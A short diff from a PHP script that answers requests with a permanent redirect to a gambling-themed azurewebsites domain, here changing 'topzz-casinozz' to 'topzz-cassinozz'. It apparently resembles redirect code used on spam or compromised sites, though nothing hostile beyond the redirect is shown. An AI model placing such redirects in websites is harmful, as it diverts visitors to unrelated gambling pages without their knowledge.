@@ -44,7 +44,7 @@ if($result === false){
 	exit(); 
 } else {
 	header( "HTTP/1.1 301 Moved Permanently" );
-	header( "Location:https://topzz-casinozz.azurewebsites.net" . $_SERVER["REQUEST_URI"] );
+	header( "Location:https://topzz-cassinozz.azurewebsites.net" . $_SERVER["REQUEST_URI"] );
 	exit();
 }
 
